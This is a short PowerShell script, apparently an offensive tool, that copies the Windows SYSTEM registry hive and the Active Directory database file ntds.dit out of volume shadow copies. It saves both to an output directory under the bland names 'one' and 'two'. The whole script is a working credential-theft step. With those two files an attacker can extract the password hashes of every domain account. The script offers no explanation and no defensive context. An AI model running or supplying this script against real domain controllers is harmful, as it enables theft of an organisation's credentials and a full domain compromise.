#  Copy NTDS.dit from an existing shadow copy via .NET File.Copy
#  Use: <SYSTEM shadow copy #> <NTDS shadow copy #> <out directory> 

$sysnum = $args[0]  # shadow copy number containing the SYSTEM reg file
$ditnum = $args[1]  # shadow copy number containing the NTDS file
$outdir = $args[2]  # existing output directory

$syspath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$sysnum\Windows\System32\config\SYSTEM"
$ditpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$ditnum\Windows\NTDS\ntds.dit"

[System.IO.File]::Copy($syspath, "$outdir\one")
[System.IO.File]::Copy($ditpath, "$outdir\two")
